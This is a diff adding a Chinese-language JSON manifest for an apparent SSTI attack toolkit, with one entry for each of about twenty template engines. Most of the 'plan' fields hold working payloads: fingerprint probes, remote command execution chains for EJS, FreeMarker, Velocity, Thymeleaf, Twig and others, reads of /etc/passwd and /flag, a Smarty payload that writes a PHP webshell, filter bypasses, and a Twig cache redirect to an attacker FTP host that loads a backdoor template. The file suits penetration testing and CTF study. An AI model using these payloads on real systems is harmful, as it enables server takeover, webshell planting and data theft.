@@ -1,0 +1,154 @@
+{
+ "ssti_angularjs.py": {
+  "name": "ssti_angularjs",
+  "description": "AngularJS 1.x 前端模板注入:constructor.constructor 执行 JS(占位符)",
+  "engine_key": "angularjs",
+  "engine_name": "AngularJS 1.x",
+  "default_mode": "info",
+  "plan": "指纹: {{7*7}}→49。\n1.6+ 无沙箱: {{constructor.constructor('alert(1)')()}}\n≤1.5 有沙箱但历史绕过链多;输出型利用(前端 XSS/RCE)。"
+ },
+ "ssti_django.py": {
+  "name": "ssti_django",
+  "description": "Django 模板注入:无直接 RCE,仅上下文泄露(% debug / settings),配合伪造 session(占位符)",
+  "engine_key": "django",
+  "engine_name": "Django",
+  "default_mode": "info",
+  "plan": "指纹: {{7*7}} 原样输出(模板语言刻意阉割,无算术)。\n模板层无法直接 RCE,只能泄露上下文: {% debug %} 输出全部变量、{{ settings.SECRET_KEY }} 视上下文是否传入。\n思路: 拿泄露信息配合其他漏洞(伪造 session、进后台),不要指望模板层拿 shell。"
+ },
+ "ssti_ejs.py": {
+  "name": "ssti_ejs",
+  "description": "EJS(Node) SSTI:模板直接内嵌 JS,execSync 即 RCE(占位符)",
+  "engine_key": "ejs",
+  "engine_name": "EJS",
+  "default_mode": "exec",
+  "plan": "指纹: <%= 7*7 %>→49。\nRCE: <%= global.process.mainModule.require('child_process').execSync(cmd).toString() %>\nrequire 被过滤: global.process.mainModule.constructor._load('child_process')。"
+ },
+ "ssti_erb.py": {
+  "name": "ssti_erb",
+  "description": "ERB(Ruby) SSTI:模板直接内嵌 Ruby,<%= system %> 即 RCE(占位符)",
+  "engine_key": "erb",
+  "engine_name": "ERB",
+  "default_mode": "exec",
+  "plan": "指纹: <%= 7*7 %>→49。\nRCE: <%= system(cmd) %>(注入点落到模板源码即 RCE)。\n过滤一般只拦 <%: 测 %> 拼接、换行符、<%% 变体。"
+ },
+ "ssti_fingerprint.py": {
+  "name": "ssti_fingerprint",
+  "description": "多引擎探针指纹识别:识别 Jinja2/Smarty/Twig/FreeMarker/Velocity/Thymeleaf/ERB/Pug 等引擎与版本(占位符)",
+  "engine_key": "fingerprint",
+  "engine_name": "SSTI 自动指纹识别",
+  "default_mode": "detect",
+  "plan": "探针表: {{7*7}}→Jinja2/Twig/Nunjucks/AngularJS; ${7*7}→FreeMarker/Velocity/EL/Mako; <%= 7*7 %>→ERB/EJS; #{7*7}→Pug; [[7*7]]→Thymeleaf 3 内联; @(7*7)→Razor; {$smarty.version}→Smarty; {{.}}→Go 模板。\nJinja2 确认: {{7*'7'}}→7777777(特有)、{{config}}→Flask 配置对象。\nSmarty 确认: {$smarty.version} 输出版本号、{math equation=\"7*7\"}→49。\n实现: 逐探针发送 → 匹配响应 → 报告引擎与版本。"
+ },
+ "ssti_freemarker.py": {
+  "name": "ssti_freemarker",
+  "description": "FreeMarker(Java) SSTI:?new 实例化 Execute 直接 RCE(占位符)",
+  "engine_key": "freemarker",
+  "engine_name": "FreeMarker",
+  "default_mode": "exec",
+  "plan": "指纹: ${7*7}→49。\nRCE(默认未限制 new_builtin_class_resolver): <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(cmd)}\n单行版: ${\"freemarker.template.utility.Execute\"?new()(cmd)}\n变体: ObjectConstructor+ProcessBuilder 构造任意类执行。"
+ },
+ "ssti_go.py": {
+  "name": "ssti_go",
+  "description": "Go 模板注入:无 import/反射,依赖已注册函数与暴露对象(占位符)",
+  "engine_key": "go",
+  "engine_name": "Go template",
+  "default_mode": "info",
+  "plan": "指纹: {{.}} 渲染根对象;{{7*7}} 报解析错误(无内建算术)。\n无 import、无反射: 只能调用已注册的模板函数和传入对象的公开方法。\nRCE 取决于应用暴露了什么: 如 {{.Exec \"id\"}} 或传入危险对象;否则只能泄露结构体字段。\nhtml/template 自动转义,但历史上仍有上下文逃逸 CVE(如 CVE-2023-24538)。"
+ },
+ "ssti_groovy.py": {
+  "name": "ssti_groovy",
+  "description": "Groovy(Jenkins 等) SSTI:字符串 .execute() 直接跑命令(占位符)",
+  "engine_key": "groovy",
+  "engine_name": "Groovy",
+  "default_mode": "exec",
+  "plan": "指纹: ${7*7}→49(Jenkins 场景 ${{7*7}})。\nRCE: ${\"id\".execute().text} —— 字符串 .execute() 直接执行命令。"
+ },
+ "ssti_handlebars.py": {
+  "name": "ssti_handlebars",
+  "description": "Handlebars SSTI:无直接 RCE,lookup/with/split 构造 Function 链(占位符)",
+  "engine_key": "handlebars",
+  "engine_name": "Handlebars",
+  "default_mode": "info",
+  "plan": "指纹: {{this}}(logic-less,无算术,{{7*7}} 报错/原样)。\n无直接 RCE: BlackHat 2019(Mahmoud Gamal)用 lookup/with/split/pop/push 摸到 constructor 构造 Function 执行。\nCTF 中更常见当 XSS/信息泄露打,RCE 链题少见。"
+ },
+ "ssti_mako.py": {
+  "name": "ssti_mako",
+  "description": "Mako(Python) SSTI:<% %> 原生 Python 代码块直接 RCE(占位符)",
+  "engine_key": "mako",
+  "engine_name": "Mako",
+  "default_mode": "exec",
+  "plan": "指纹: ${7*7}→49。\nRCE: <% import os %><% print(os.popen(cmd).read()) %>\n<% 被过滤时: ${__import__('os').popen(cmd).read()}。"
+ },
+ "ssti_nunjucks.py": {
+  "name": "ssti_nunjucks",
+  "description": "Nunjucks(Node) SSTI:range.constructor 构造 Function 执行命令(占位符)",
+  "engine_key": "nunjucks",
+  "engine_name": "Nunjucks",
+  "default_mode": "exec",
+  "plan": "指纹: {{7*7}}→49(Jinja2 移植版)。\nRCE: {{range.constructor(\"return global.process.mainModule.require('child_process').execSync(cmd).toString()\")()}}"
+ },
+ "ssti_pug.py": {
+  "name": "ssti_pug",
+  "description": "Pug(Node) SSTI:换行另起输出行 = execSync RCE(占位符)",
+  "engine_key": "pug",
+  "engine_name": "Pug",
+  "default_mode": "exec",
+  "plan": "指纹: #{7*7}→49。\n输入常被拼进模板源码: 换行另起一行输出语句 = global.process.mainModule.require('child_process').execSync(cmd).toString()\n也可构造 - var x = ... 代码行;本质都是 JS 注入。"
+ },
+ "ssti_razor.py": {
+  "name": "ssti_razor",
+  "description": "Razor(.NET) SSTI:注入 .cshtml 代码区 Process.Start 执行(占位符)",
+  "engine_key": "razor",
+  "engine_name": "Razor",
+  "default_mode": "exec",
+  "plan": "指纹: @(7*7)→49。\nRCE: 需注入到 .cshtml 代码区: @System.Diagnostics.Process.Start(\"cmd.exe\",\"/c whoami\")"
+ },
+ "ssti_slim.py": {
+  "name": "ssti_slim",
+  "description": "Slim(Ruby) SSTI:行首 = / - 注入 Ruby 语句(占位符)",
+  "engine_key": "slim",
+  "engine_name": "Slim",
+  "default_mode": "exec",
+  "plan": "指纹: 行首 = 7*7→49。\nRCE: 行首 = 输出命令结果 = %x{cmd};行首 - 静默执行 - system(cmd)。"
+ },
+ "ssti_smarty.py": {
+  "name": "ssti_smarty",
+  "description": "Smarty(PHP) SSTI:{system()} 执行、security 沙箱逃逸、include/fetch 文件读(占位符)",
+  "engine_key": "smarty",
+  "engine_name": "Smarty",
+  "default_mode": "exec",
+  "plan": "指纹: {$smarty.version}→版本号、{$smarty.security}→1/0、{math equation=\"7*7\"}→49。\n直接 RCE(security 关闭): {system(cmd)}、回显式 {if system(cmd)}{/if}、{passthru(cmd)}、{assert(\"file_put_contents('a.php','<?php @eval($_POST[1]);?>')\")} 写 webshell(PHP7)。\nsecurity 逃逸(3.1.x<3.1.39, CVE-2021-26119/20): {$smarty.template_object->smarty->disableSecurity()} 再 {system(cmd)};3.1.39+ 已修复。\n文件读: {include file='/flag'}、{fetch file='/etc/passwd'}(file_get_contents);Smarty 2: {php}...{/php}、{include_php file=}。\n绕过: 函数名大写 {SYSTEM(cmd)}、引号过滤用 $smarty.get.x 外带、无回显写 webshell / {if} 布尔回显 / DNS 外带。"
+ },
+ "ssti_thymeleaf.py": {
+  "name": "ssti_thymeleaf",
+  "description": "Thymeleaf/SpEL(Java) SSTI:预处理表达式 + T(java.lang.Runtime) RCE(占位符)",
+  "engine_key": "thymeleaf",
+  "engine_name": "Thymeleaf / SpringEL",
+  "default_mode": "exec",
+  "plan": "指纹: [[7*7]]→49(Thymeleaf 3 内联)、${7*7}→49(SpEL)。\nRCE 预处理表达式: __${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(cmd).getInputStream()).next()}__::.x\n无回显探测: __${T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')}__::.x\n::.x 是模板片段表达式,让预处理在视图解析流程里触发。"
+ },
+ "ssti_tornado.py": {
+  "name": "ssti_tornado",
+  "description": "Tornado(Python) SSTI:模板内直接 import 模块 RCE、handler.settings 泄露(占位符)",
+  "engine_key": "tornado",
+  "engine_name": "Tornado",
+  "default_mode": "exec",
+  "plan": "指纹: {{7*7}}→49。\nRCE: {%import os%}{{os.popen(cmd).read()}}、{%from os import popen%}{{popen(cmd).read()}}。\n信息泄露: {{handler.settings}} 常含 cookie_secret 等敏感配置。"
+ },
+ "ssti_twig.py": {
+  "name": "ssti_twig",
+  "description": "Twig(PHP) SSTI:回调注册 RCE、filter/map/sort 传函数名、source/include 文件读(占位符)",
+  "engine_key": "twig",
+  "engine_name": "Twig",
+  "default_mode": "exec",
+  "plan": "指纹: {{7*7}}→49、{{constant('PHP_VERSION')}}、{{_self.env}}→Twig Environment(核心攻击面)。\nRCE: {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(cmd)}}\nTwig 1/2: {{[cmd]|filter('system')}}、{{[cmd]|map('system')}};Twig 1.x: {{[cmd,0]|sort('system')}}。\n文件读: {{source('/flag')}}、{{include('/flag')}}。\n老版本逃逸: {{_self.env.setCache(\"ftp://attacker:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}} 缓存目录指向攻击者 FTP 触发 SSRF。"
+ },
+ "ssti_velocity.py": {
+  "name": "ssti_velocity",
+  "description": "Velocity(Java) SSTI:反射链 Runtime.exec + Character 逐字节回显(占位符)",
+  "engine_key": "velocity",
+  "engine_name": "Velocity",
+  "default_mode": "exec",
+  "plan": "指纹: #set($x=7*7)${x}→49。\nRCE 反射链($s.class 即 getClass()): #set($s=\"\") #set($rt=$s.class.forName(\"java.lang.Runtime\")) #set($ex=$rt.getRuntime().exec(cmd)) $ex.waitFor() #set($out=$ex.getInputStream()) #set($str=$s.class.forName(\"java.lang.String\")) #set($chr=$s.class.forName(\"java.lang.Character\")) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end\n无回显场景可改 DNS 外带。"
+ }
+}
